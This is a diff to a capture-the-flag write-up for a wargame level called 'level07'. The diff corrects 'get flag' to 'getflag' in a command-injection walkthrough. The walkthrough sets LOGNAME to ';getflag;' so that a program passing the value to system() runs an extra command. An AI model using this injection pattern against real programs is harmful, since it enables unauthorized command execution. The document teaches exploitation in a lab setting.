@@ -201,7 +201,7 @@ Analyze the executable `level07`, identify its functionality with GDB (GNU Debug
 	To exploit this vulnerability and retrieve the token:
 - Modify the `LOGNAME` environment variable to inject our command and execute `level07`:
 	```bash
-	export LOGNAME=";get flag;"
+	export LOGNAME=";getflag;"
 	./level07
 	```
 	Output:
@@ -210,8 +210,8 @@ Analyze the executable `level07`, identify its functionality with GDB (GNU Debug
 	```
 - When the program executes, `asprintf` will create the command:
 	```bash
-	/bin/echo ;get flag;
+	/bin/echo ;getflag;
 	```
 	- During execution with `system`, the shell will:
 	- Execute `/bin/echo` (which produces nothing as it has no argument)
-	- Execute `get flag` (which retrieves the token)
+	- Execute `getflag` (which retrieves the token)
